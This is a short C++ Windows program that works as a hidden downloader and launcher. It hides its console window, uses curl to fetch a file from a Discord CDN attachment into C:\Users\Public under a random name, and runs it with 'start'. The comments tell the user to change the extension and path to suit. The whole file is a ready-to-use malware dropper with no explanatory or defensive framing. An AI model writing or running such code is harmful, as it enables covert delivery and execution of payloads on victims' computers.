#include <iostream>
#include <string>
#include <process.h>
#include <windows.h>

using namespace std;

std::string gen_random(const int len) {
	static const char alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";
	std::string tmp_s;
	tmp_s.reserve(len);

	for (int i = 0; i < len; ++i) {
		tmp_s += alphanum[rand() % (sizeof(alphanum) - 1)];
	}

	return tmp_s;
}

const string URL = "https://cdn.discordapp.com/attachments/967472930722287707/980067759180378162/background.png";

int main()
{

	::ShowWindow(::GetConsoleWindow(), SW_HIDE); // This hides the console window, just remove it if you dont need it
	
	srand((unsigned)time(NULL) * _getpid());
	string filepath = "c:\\users\\public\\" + gen_random(8) + ".png"; // Change file extention and download path here!

	string download_cmd = "curl " + URL + " -o " + filepath;
	system(download_cmd.c_str());

	string execute_cmd = "start " + filepath;
	system(execute_cmd.c_str());
	
	exit(3);

}
